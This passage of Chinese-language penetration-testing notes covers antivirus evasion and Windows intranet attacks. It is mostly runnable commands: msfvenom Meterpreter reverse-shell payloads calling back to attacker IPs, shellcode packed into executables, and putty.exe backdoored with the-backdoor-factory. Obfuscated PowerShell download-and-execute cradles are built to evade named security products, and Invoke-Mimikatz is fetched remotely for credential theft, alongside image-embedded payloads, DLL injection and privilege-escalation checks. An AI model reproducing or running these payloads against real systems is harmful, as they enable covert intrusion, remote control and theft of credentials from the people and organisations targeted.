粘贴shellcode到shellcode+c.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\Python27\Scripts目录使用命令把py打包为exe
&gt;python pyinstaller-script.py -F -w shellcode.py
会在目录下生成dist文件夹，exe文件就在里面
</code></pre>
<h4 id="pyinstaller加载py代码编译"><a href="#pyinstaller加载py代码编译" class="headerlink" title="pyinstaller加载py代码编译(*)"></a>pyinstaller加载py代码编译(*)</h4><pre><code>生成py格式payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp LPORT=12138 LHOST=192.168.0.108 -e x86/shikata_ga_nai -i 11 -f py -o /var/www/html/1.py
粘贴shellcode到shellcode+py.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\Python27\Scripts目录使用命令把py打包为exe
&gt;python pyinstaller-script.py --console --onefile shellcode.py
会在目录下生成dist文件夹，exe文件就在里面
</code></pre>
<p><img src="60.png" alt="image"><br><img src="61.png" alt="image"><br><img src="62.png" alt="image"></p>
<h4 id="Py2exe打包exe"><a href="#Py2exe打包exe" class="headerlink" title="Py2exe打包exe"></a>Py2exe打包exe</h4><pre><code>生成raw格式payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
&gt;msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/shell.py
在32位系统上安装python、py2exe
创建setup.py放置同一目录
</code></pre>
<p><img src="63.png" alt="image"></p>
<pre><code>from distutils.core import setup
import py2exe
setup(
name = &quot;Meter&quot;,
description = &quot;Python-based App&quot;,
version = &quot;1.0&quot;,
console = [&quot;shell.py&quot;],
options = &#123;&quot;py2exe&quot;:&#123;&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,&#125;&#125;,
zipfile = None
)
执行打包命令
&gt;python setup.py py2exe
会在当前目录生成dist文件夹，打包好的exe在里面
</code></pre>
<p><img src="64.png" alt="image"></p>
<h4 id="Base64编码-Pyinstaller打包"><a href="#Base64编码-Pyinstaller打包" class="headerlink" title="Base64编码+Pyinstaller打包"></a>Base64编码+Pyinstaller打包</h4><pre><code>MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
&gt;msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c
Shellcode粘贴在shellcode+base64+c.py中
&gt;python pyinstaller-script.py -F -w shellcode.py
会在目录下生成dist文件夹，exe文件就在里面
</code></pre>
<h4 id="加载器分离"><a href="#加载器分离" class="headerlink" title="加载器分离"></a>加载器分离</h4><h5 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h5><pre><code>生成c格式payload
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c
下载k8final
</code></pre>
<p><img src="65.png" alt="image"></p>
<pre><code>粘贴shellcode进去
</code></pre>
<p><img src="66.png" alt="image"></p>
<pre><code>使用
https://github.com/k8gege/scrun
</code></pre>
<p><img src="67.png" alt="image"></p>
<pre><code>或
&gt;python scrun.py xxx
或
编译ScRunHex.py为exe
</code></pre>
<h5 id="Base64"><a href="#Base64" class="headerlink" title="Base64(*)"></a>Base64(*)</h5><pre><code>生成c格式payload
&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c
下载k8final
</code></pre>
<p><img src="68.png" alt="image"></p>
<pre><code>粘贴shellcode进去
</code></pre>
<p><img src="69.png" alt="image"></p>
<pre><code>进行hex编码后，粘贴进去base64编码
</code></pre>
<p><img src="70.png" alt="image"></p>
<pre><code>看系统位数编译ScRunBase.py文件，使用pyinstaller打包为exe后执行
https://gitee.com/RichChigga/scrun/blob/master/ScRunBase64.py
&gt;python pyinstaller-script.py -F -w ScRunBase64.py
</code></pre>
<p><img src="71.png" alt="image"><br><img src="72.png" alt="image"></p>
<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><pre><code>白dll劫持
Processmonitor查找程序加载的dll
使用stud_pe加载dll进去
或
生成payload免杀好粘贴进去，查看目标上有什么软件，本地查找可劫持的dll,劫持好文件后传上去。
</code></pre>
<p><img src="73.png" alt="image"></p>
<h3 id="MSBuild"><a href="#MSBuild" class="headerlink" title="MSBuild"></a>MSBuild</h3><pre><code>链接
https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f csharp
远程执行
&gt;wmiexec.py &lt;USER&gt;:&#39;&lt;PASS&gt;&#39;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml
要设置自动迁移进程
</code></pre>
<p><img src="74.png" alt="image"></p>
<h3 id="GreatSCT"><a href="#GreatSCT" class="headerlink" title="GreatSCT"></a>GreatSCT</h3><pre><code>&gt;use Bypass
&gt;list
&gt;use regasm/meterpreter/rev_tcp.py
&gt;msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
</code></pre>
<h3 id="Mshta"><a href="#Mshta" class="headerlink" title="Mshta"></a>Mshta</h3><pre><code>https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta
生成
&gt;msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.bin
&gt;cat 1.bin |base64 -w 0
</code></pre>
<p><img src="75.png" alt="image"></p>
<pre><code>编码后的内容复制到
</code></pre>
<p><img src="76.png" alt="image"></p>
<pre><code>执行
&gt;mshta http://192.168.0.106:1222/1.hta
360执行检测出来，静态动态无法检测、火绒无法检测
</code></pre>
<h3 id="InstallUtil"><a href="#InstallUtil" class="headerlink" title="InstallUtil"></a>InstallUtil</h3><pre><code>内网文章中有介绍
</code></pre>
<h3 id="Veil"><a href="#Veil" class="headerlink" title="Veil"></a>Veil</h3><pre><code>&gt;use 1选择evasion模块
&gt;list查看可用payload
&gt;use 7 选择c格式的payload
&gt;set LHOST/LPORT设置回连IP和端口
&gt;generate生成
</code></pre>
<p><img src="77.png" alt="image"></p>
<pre><code>直接生成的exe可能会被查杀，目前可过360，不能过火绒
使用minGW-w64编译C文件
&gt;gcc -o vel.exe veil.c -l ws2_32
</code></pre>
<h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 lhost=192.168.0.108 lport=3333 RC4PASSWORD=123qwe!@# -f c
</code></pre>
<h3 id="捆绑-1"><a href="#捆绑-1" class="headerlink" title="捆绑"></a>捆绑</h3><pre><code>&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -x PsExec64.exe  -i 15 -f exe -o /var/www/html/payload4.exe
</code></pre>
<h3 id="Evasion模块"><a href="#Evasion模块" class="headerlink" title="Evasion模块"></a>Evasion模块</h3><pre><code>&gt;show evasion
</code></pre>
<h3 id="Phantom-Evasion"><a href="#Phantom-Evasion" class="headerlink" title="Phantom-Evasion"></a>Phantom-Evasion</h3><p><img src="78.png" alt="image"><br><img src="79.png" alt="image"></p>
<h3 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h3><pre><code>仅支持32位程序
&gt;apt install shellter
指定一个exe文件
</code></pre>
<p><img src="80.png" alt="image"></p>
<pre><code>选择payload
</code></pre>
<h3 id="the-backdoor-factory"><a href="#the-backdoor-factory" class="headerlink" title="the-backdoor-factory"></a>the-backdoor-factory</h3><pre><code>查看是否支持捆绑
&gt;python backdoor.py -f /root/Desktop/putty.exe -S
查看此文件支持哪些payload
&gt;python backdoor.py -f /root/Desktop/putty.exe -s show
reverse_shell_tcp_inline对应msf
set payload windows/meterpreter/reverse_tcp
meterpreter_reverse_https_threaded应msf
set payload windows/meterpreter/reverse_https
iat_reverse_tcp_stager_threaded修复IAT
user_supplied_shellcode_threaded自定义payload
参数
-s 指定payload
-H 回连地址
-P 回连端口
-J 多代码裂缝注入
&gt;python backdoor.py -f ~/putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.0.108 -P 12138 -J -o payload.exe
后门生成在backdoored目录
或
生成payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -i 5 -f raw -o shellcode.c
自定义
&gt;python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shellcode.c  -o payload2.exe
</code></pre>
<h3 id="zirikatu"><a href="#zirikatu" class="headerlink" title="zirikatu"></a>zirikatu</h3><p><img src="81.png" alt="image"></p>
<h3 id="hanzoInjection"><a href="#hanzoInjection" class="headerlink" title="hanzoInjection"></a>hanzoInjection</h3><pre><code>https://github.com/P0cL4bs/hanzoInjection
生成
&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f raw -o /var/www/html/1.bin
&gt;HanzoInjection.exe -p 1.bin -o 1.cs
编译1.cs
属性-生成-允许不安全代码
</code></pre>
<h2 id="PowerShell免杀"><a href="#PowerShell免杀" class="headerlink" title="PowerShell免杀"></a>PowerShell免杀</h2><h3 id="直接生成"><a href="#直接生成" class="headerlink" title="直接生成"></a>直接生成</h3><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f psh -o /var/www/html/1.ps1
执行
&gt;powershell -ep bypass -noexit -file 1.ps1
Powershell行为检测bypass
&gt;powershell -noexit &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;
</code></pre>
<h3 id="Invoke-Shellcode加载"><a href="#Invoke-Shellcode加载" class="headerlink" title="Invoke-Shellcode加载"></a>Invoke-Shellcode加载</h3><pre><code>生成code
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f powershell -o /var/www/html/1.ps1
目标执行
&gt; powershell -ep bypass
&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/ps/powersploit/CodeExecution/Invoke-Shellcode.ps1&#39;)
&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/1.ps1&#39;)
&gt; Invoke-Shellcode -Shellcode ($buf) -Force
</code></pre>
<p><img src="82.png" alt="image"><br><img src="83.png" alt="image"></p>
<pre><code>防护软件没反应
</code></pre>
<h3 id="Invoke-Obfuscation"><a href="#Invoke-Obfuscation" class="headerlink" title="Invoke-Obfuscation"></a>Invoke-Obfuscation</h3><pre><code>https://github.com/danielbohannon/Invoke-Obfuscation
生成code
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f psh -o /var/www/html/1.ps1
&gt;powershell -ep bypass
&gt;Import-Module .\Invoke-Obfuscation.psd1
&gt;Invoke-Obfuscation
&gt;set scriptpath C:\Users\y\Desktop\1.ps1
&gt;encoding
&gt;3 指定编码方式
&gt;out C:\Users\y\Desktop\ok.ps1 保存
</code></pre>
<p><img src="84.png" alt="image"><br><img src="85.png" alt="image"></p>
<pre><code>执行
&gt;powershell -ep bypass -noexit -file ok.ps1
</code></pre>
<p><img src="86.png" alt="image"><br><img src="87.png" alt="image"><br><img src="88.png" alt="image"></p>
<h3 id="Xencrypt"><a href="#Xencrypt" class="headerlink" title="Xencrypt"></a>Xencrypt</h3><pre><code>https://github.com/the-xentropy/xencrypt/blob/master/xencrypt.ps1
&gt;Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100 递归分层躲避动态查杀
</code></pre>
<p><img src="89.png" alt="image"></p>
<pre><code>&gt;Invoke-Xencrypt -infile .\Invoke-Mimikatz.ps1 -outfile mimi.ps1
</code></pre>
<p><img src="90.png" alt="image"><br><img src="91.png" alt="image"></p>
<h3 id="PyFuscation"><a href="#PyFuscation" class="headerlink" title="PyFuscation"></a>PyFuscation</h3><pre><code>https://github.com/CBHue/PyFuscation
对函数，参数，变量进行混淆
&gt;python3 PyFuscation.py -fvp --ps Invoke-Mimikatz.ps1
</code></pre>
<p><img src="92.png" alt="image"><br><img src="93.png" alt="image"></p>
<h3 id="拆分-C编译"><a href="#拆分-C编译" class="headerlink" title="拆分+C编译"></a>拆分+C编译</h3><pre><code>#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
int main()&#123;
system(&quot;powershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)&quot;);
return 0;
&#125;
</code></pre>
<h3 id="行为检测"><a href="#行为检测" class="headerlink" title="行为检测"></a>行为检测</h3><pre><code>&gt;powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;
</code></pre>
<h3 id="Out-EncryptedScript"><a href="#Out-EncryptedScript" class="headerlink" title="Out-EncryptedScript"></a>Out-EncryptedScript</h3><pre><code>http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1
&gt;Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password shabiisme -Salt 123456
</code></pre>
<p><img src="94.png" alt="image"><br><img src="95.png" alt="image"></p>
<pre><code>PS &gt; IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1&quot;)
PS &gt; [String] $cmd = Get-Content .\evil.ps1
PS &gt; Invoke-Expression $cmd
PS &gt; $decrypted = de shabiisme 123456
PS &gt; Invoke-Expression $decrypted
PS &gt; Invoke-Mimikatz
</code></pre>
<h3 id="cobalt-strike-powershell免杀"><a href="#cobalt-strike-powershell免杀" class="headerlink" title="cobalt strike powershell免杀"></a>cobalt strike powershell免杀</h3><pre><code>From: https://y4er.com/post/cobalt-strike-powershell-bypass/
powershell&gt;$string = &#39;&#39;
powershell&gt;$s = [Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;[cs生成的shellcode]&#39;)
powershell&gt;$s |foreach &#123; $string = $string + $_.ToString()+&#39;,&#39;&#125;
powershell&gt;$string&gt;c:\1.txt
修改ps脚本
[Byte[]]$var_code = [Byte[]](payload)
再混淆一下函数和变量
绕过执行命令的拦截
使用cs的参数欺骗
beacon &gt; argue cmd.exe blablabla
</code></pre>
<h3 id="分块免杀"><a href="#分块免杀" class="headerlink" title="分块免杀"></a>分块免杀</h3><pre><code>生成
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.0.108 LPORT=443 -f psh-net -o shity_shellcode.ps1
</code></pre>
<p><img src="700.png" alt="image"></p>
<pre><code>先来测试一下，把ps1文件的shellcode换成一段无害的字符串
</code></pre>
<p><img src="701.png" alt="image"><br><img src="702.png" alt="image"></p>
<pre><code>结果发现还是被查杀了
</code></pre>
<p><img src="703.png" alt="image"></p>
<pre><code>这表明大多数检测来自PowerShell模板，而不是Shellcode本身。
下面几种bypass方法
1.将字符串分成几部分并创建中间变量；
2.添加大量垃圾备注；
3.添加一些垃圾指令，例如循环或睡眠指令（对于沙盒有用）。
[DllImport(&quot;kernel32.dll&quot;)]
变为
[DllImport(&quot;ke&quot;+&quot;rne&quot;+&quot;l32.dll&quot;)] #可绕过赛门铁克
$przdE.ReferencedAssemblies.AddRange(@(&quot;System.dll&quot;,[PsObject].Assembly.Location))
变为
$magic=&quot;Syst&quot;+&quot;em&quot;+&quot;.dll&quot;;
$przdE.ReferencedAssemblies.AddRange(@($magic,[PsObject].Assembly.Location))
分割shellcode
$sc0=&lt;shellcode的第1部分&gt;; …$sc7=&lt;shellcode的第8部分&gt;; [Byte[]]$tcomplete_sc=[System.Convert]::FromBase64String($sc0+$sc1+…+$sc7)
一些细节可参照
https://raw.githubusercontent.com/kmkz/Pentesting/master/AV_Evasion/AV_Bypass.ps1
我不太懂汇编语言，所以没有添加无害指令。
这里直接使用一键生成的bash脚本，有时间的可以读读里面的命令
https://github.com/darksh3llRU/tools/blob/master/psh-net_shellcode_fastchange.sh
这个脚本是生成个hta的，脚本以1337个字符来分块
</code></pre>
<p><img src="704.png" alt="image"></p>
<pre><code>我测试的时候1337个字符会被赛门铁克查杀到，我这里修改成250个字符来分块
</code></pre>
<p><img src="705.png" alt="image"></p>
<pre><code>因为我没加汇编指令，中间这里直接按任意键跳过即可，懂的可以在开头添加一些指令，例如xor，inc，dec，add，sub，mov，nop等
</code></pre>
<p><img src="706.png" alt="image"></p>
<pre><code>执行完后会生成一些文件
</code></pre>
<p><img src="707.png" alt="image"></p>
<pre><code>我们只用final_pshnet_revhttps.ps1这个文件，打开修改一下
</code></pre>
<p><img src="708.png" alt="image"></p>
<pre><code>修改成
</code></pre>
<p><img src="709.png" alt="image"><br><img src="710.png" alt="image"><br><img src="711.png" alt="image"></p>
<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><pre><code>目标机器装有ruby时
生成
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f ruby
粘贴到ruby中
</code></pre>
<p><img src="96.png" alt="image"></p>
<pre><code>执行
&gt;ruby xx.ruby
</code></pre>
<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><pre><code>生成
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c
代码转换成0x格式，粘贴到go.txt中保存为go格式
</code></pre>
<p><img src="97.png" alt="image"></p>
<pre><code>安装golang环境在shellcode目录执行
&gt;go build生成exe
</code></pre>
<h3 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h3><h4 id="go-shellcode"><a href="#go-shellcode" class="headerlink" title="go-shellcode"></a>go-shellcode</h4><pre><code>https://github.com/brimstone/go-shellcode
进入cmd/sc目录编译sc.exe
&gt;go build
</code></pre>
<p><img src="98.png" alt="image"></p>
<pre><code>生成
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f hex -o shell.txt 
加载器加载shellcode
&gt;sc.exe shellcode
</code></pre>
<p><img src="99.png" alt="image"></p>
<h4 id="Gsl"><a href="#Gsl" class="headerlink" title="Gsl"></a>Gsl</h4><pre><code>https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip
&gt;gsl -s SHELLCODE -hex msf生成hex格式
&gt;gsl -f shell.raw本地加载raw格式文件
&gt;gsl -f shell.hex -hex 本地加载hex格式文件
&gt;gsl -u http://192.168.0.108/1.raw 远程加载
&gt;gsl -u http://192.168.0.108/1.hex
</code></pre>
<h1 id="内网-amp-域"><a href="#内网-amp-域" class="headerlink" title="内网&amp;域"></a>内网&amp;域</h1><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><pre><code>查看版本$PSVersionTable
</code></pre>
<h3 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h3><pre><code>&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;);Invoke-xxx&quot;
</code></pre>
<p><img src="100.png" alt="image"></p>
<h3 id="加载exe"><a href="#加载exe" class="headerlink" title="加载exe"></a>加载exe</h3><pre><code>msfvenom生成exe木马
#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe &gt; /var/www/html/1.exe  
使用powersploit的Invoke-ReflectivePEInjection.ps1脚本
#powershell.exe -w hidden -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR&quot; 
</code></pre>
<h3 id="EXE2PS1"><a href="#EXE2PS1" class="headerlink" title="EXE2PS1"></a>EXE2PS1</h3><pre><code>http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1
将exe转换为base64
&gt;Import-Module .\Convert-BinaryToString.ps1
&gt;Convert-BinaryToString -FilePath .\ms15051.exe
</code></pre>
<p><img src="101.png" alt="image"></p>
<pre><code>http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection.ps1文件头部添加
Function MS15051&#123;
&lt;#
.SYNOPSIS    
.EXAMPLE
C:\PS&gt; MS15051 -Command &quot;whoami&quot;
#&gt;
 [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [string]
        $Command
  )
$InputString = &quot;文件的base64编码&quot;
$PEBytes = [System.Convert]::FromBase64String($InputString)
文件尾部添加
write-host (&quot;[+] Executing Command: &quot;+$Command)  -foregroundcolor &quot;Green&quot;
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command 
write-host (&quot;[+] Done !&quot;)  -foregroundcolor &quot;Green&quot;
&#125;
</code></pre>
<p><img src="102.png" alt="image"></p>
<pre><code>远程下载执行
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1&#39;); MS15051 –Command \&quot;whoami\&quot;&quot;
</code></pre>
<p><img src="103.png" alt="image"></p>
<h3 id="绕过策略"><a href="#绕过策略" class="headerlink" title="绕过策略"></a>绕过策略</h3><pre><code>&gt;powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行
&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-xxx.ps1&#39;);invoke-xxx&quot;
&gt;powershell -exec bypass -File ./a.ps1&amp;&gt;Import-Module xxx
</code></pre>
<h4 id="Base64-1"><a href="#Base64-1" class="headerlink" title="Base64"></a>Base64</h4><pre><code>&gt;use exploit/multi/script/web_delivery|target=2(PSH)
&amp;
&gt;cat payload.txt | iconv --to-code UTF-16LE |base64
&gt;powershell -ep bypass -enc base64code
</code></pre>
<h4 id="写入bat绕过"><a href="#写入bat绕过" class="headerlink" title="写入bat绕过"></a>写入bat绕过</h4><pre><code>powershell -exec bypass -File ./a.ps1 
将该命令保存为c.bat
</code></pre>
<h4 id="拼接拆分字符串"><a href="#拼接拆分字符串" class="headerlink" title="拼接拆分字符串"></a>拼接拆分字符串</h4><pre><code>powershell.exe  
&quot;
$c1=&#39;powershell -c IEX&#39;; 
$c2=&#39;(New-Object Net.WebClient).Downlo&#39;; 
$c3=&#39;adString(&quot;http://192.168.197.192/a.ps1&quot;)&#39;; 
echo ($c1,$c2,$c3) 
&quot; 
先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。
powershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)
</code></pre>
<h4 id="Replace替换函数"><a href="#Replace替换函数" class="headerlink" title="Replace替换函数"></a>Replace替换函数</h4><pre><code>powershell -noexit &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot; 
</code></pre>
<h4 id="HTTP字符拼接绕过"><a href="#HTTP字符拼接绕过" class="headerlink" title="HTTP字符拼接绕过"></a>HTTP字符拼接绕过</h4><pre><code>也可以对http字符进行绕过，同样可以bypass
powershell &quot;$a=&#39;IEX((new-object net.webclient).downloadstring(&quot;ht&#39;;$b=&#39;tp://192.168.197.192/a.ps1&quot;))&#39;;IEX ($a+$b)&quot;  
</code></pre>
<h4 id="图片免杀"><a href="#图片免杀" class="headerlink" title="图片免杀"></a>图片免杀</h4><pre><code>通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。
https://github.com/peewpw/Invoke-PSImage
1900*1200的图片x.jpg。
C:\&gt;powershell 
PS C:\&gt; Import-Module .\Invoke-PSImage.ps1 
PS C:\&gt; Invoke-PSImage -Script .\a.ps1 -Image .\x.jpg -Out .\reverse_shell.png -Web 
a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。
将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。
</code></pre>
<h4 id="加载shellcode"><a href="#加载shellcode" class="headerlink" title="加载shellcode"></a>加载shellcode</h4><pre><code>msfvenom生成脚本木马
#msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  
在windows靶机上运行一下命令
PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;) 
PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.72.164/test&quot;) 
Invoke-Shellcode -Shellcode $buf -Force  运行木马 
使用Invoke-Shellcode.ps1脚本执行shellcode
即可反弹meterpreter shell
</code></pre>
<h4 id="加载dll"><a href="#加载dll" class="headerlink" title="加载dll"></a>加载dll</h4><pre><code>使用msfvenom 生成dll木马脚本
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll 
将生成的dll上传到目标的C盘。在靶机上执行以下命令
PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;) 
Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden  
创建新的进程启动记事本，并设置为隐藏
Invoke-DllInjection -ProcessID xxx -Dll c:\test.dll 使用notepad的PID  
Msf
#use exploit/multi/handler
#set payload windows/x64/meterpreter/reverse_tcp
#run
</code></pre>
<h2 id="Windows安全标识符-SID"><a href="#Windows安全标识符-SID" class="headerlink" title="Windows安全标识符(SID)"></a>Windows安全标识符(SID)</h2><table>
<thead>
<tr>
<th>相对标识符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>500</td>
<td>管理员</td>
</tr>
<tr>
<td>501</td>
<td>来宾</td>
</tr>
<tr>
<td>502</td>
<td>密钥分发中心服务的服务账户</td>
</tr>
<tr>
<td>512</td>
<td>域管理员</td>
</tr>
<tr>
<td>513</td>
<td>域用户</td>
</tr>
<tr>
<td>514</td>
<td>域来宾</td>
</tr>
<tr>
<td>515</td>
<td>域计算机</td>
</tr>
<tr>
<td>516</td>
<td>域控制器</td>
</tr>
<tr>
<td>544</td>
<td>内置管理员</td>
</tr>
<tr>
<td>519</td>
<td>企业管理员</td>
</tr>
</tbody></table>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Impacket工具包"><a href="#Impacket工具包" class="headerlink" title="Impacket工具包"></a>Impacket工具包</h3><pre><code>https://github.com/maaaaz/impacket-examples-windows
https://github.com/SecureAuthCorp/impacket
#git clone https://github.com/CoreSecurity/impacket.git 
#cd impacket/ 
#python setup.py install
</code></pre>
<h3 id="Windows-exploit-suggester"><a href="#Windows-exploit-suggester" class="headerlink" title="Windows-exploit-suggester"></a>Windows-exploit-suggester</h3><pre><code>#pip install xlrd --upgrade
#./windows-exploit-suggester.py --update
#./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt
</code></pre>
<h3 id="Wesng"><a href="#Wesng" class="headerlink" title="Wesng"></a>Wesng</h3><pre><code>https://github.com/bitsadmin/wesng
&gt;systeminfo &gt;1.txt
&gt;python wes.py 1.txt
</code></pre>
<p><img src="104.png" alt="image"></p>
<h3 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h3><pre><code>使用方法
&gt;searchsploit 软件 版本
查找常见补丁
https://bugs.hacking8.com/tiquan/
http://get-av.se7ensec.cn/index.php
https://patchchecker.com/checkprivs/
wmic查询补丁
wmic qfe list full|findstr /i hotfix
systeminfo&gt;temp.txt&amp;(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do @type temp.txt|@find /i  &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txt
